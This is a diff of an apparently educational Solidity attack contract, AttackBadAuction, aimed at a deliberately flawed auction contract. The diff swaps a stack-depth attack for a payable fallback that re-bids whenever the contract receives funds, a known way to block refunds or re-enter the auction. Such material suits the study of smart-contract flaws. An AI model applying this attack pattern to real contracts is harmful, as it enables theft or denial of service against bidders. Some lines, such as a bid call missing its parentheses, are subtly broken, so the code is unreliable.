@@ -10,27 +10,28 @@ the auction contract
 **/
 
 contract AttackBadAuction {
-
     BadAuction private auction;
 
-    constructor(address _badAuctionAddress) {
+    event Balance(uint256 value);
+    event Balance2(uint256 value);
+
+    constructor(address _badAuctionAddress) public {
         // create new instance of the contract
         require(_badAuctionAddress != address(0), 'invalid auction contract address');
         auction = BadAuction(_badAuctionAddress);
     }
 
-    function attack() public {
-        for (uint256 i=0; i <= 1023; i++){
-            if(i==1023) {
-                //max stack depth reach 1024 when send() method is called
-                // which in turn will fail without reverting
-                // an error. The previous bidder will not receive the refund,
-                // but the new bidder will still be highest bidder
-                auction.bid(msg.value);
-            }else {
-                // recursive call to reach the max stack depth
-                attack();
-            }
-        }
+    function getBalance() public {
+        emit Balance(address(this).balance);
+    }
+
+    function () public payable{
+        emit Balance2(1);
+        auction.bid.value(msg.value)();
+    }
+
+    function attackAuction() public payable{
+        auction.bid.value(msg.value);
+        emit Balance(address(this).balance);
     }
 }
